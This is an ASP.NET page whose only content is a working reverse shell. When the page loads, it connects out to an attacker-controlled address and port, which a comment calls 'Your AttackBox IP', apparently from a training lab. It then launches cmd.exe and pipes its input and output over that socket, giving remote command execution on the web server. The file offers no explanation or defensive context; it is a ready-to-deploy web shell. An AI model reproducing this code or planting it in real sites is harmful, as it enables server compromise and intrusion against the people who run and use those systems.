<%@ Page Language="C#" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
    private void Page_Load(object sender, EventArgs e)
    {
        string ip = "10.10.77.155"; // Your AttackBox IP address
        int port = 45454; // The port you're listening on
        System.Net.Sockets.TcpClient client = new System.Net.Sockets.TcpClient(ip, port);
        Stream stream = client.GetStream();
        StreamReader rdr = new StreamReader(stream);
        StreamWriter wtr = new StreamWriter(stream);
        wtr.AutoFlush = true;
        String shell = "cmd.exe";
        Process proc = new Process();
        proc.StartInfo.FileName = shell;
        proc.StartInfo.RedirectStandardOutput = true;
        proc.StartInfo.RedirectStandardInput = true;
        proc.StartInfo.RedirectStandardError = true;
        proc.StartInfo.UseShellExecute = false;
        proc.StartInfo.CreateNoWindow = true;
        proc.Start();
        StreamReader procOut = proc.StandardOutput;
        StreamWriter procIn = proc.StandardInput;
        while (true)
        {
            wtr.WriteLine(procOut.ReadLine());
            procIn.WriteLine(rdr.ReadLine());
        }
        proc.Close();
    }
</script>
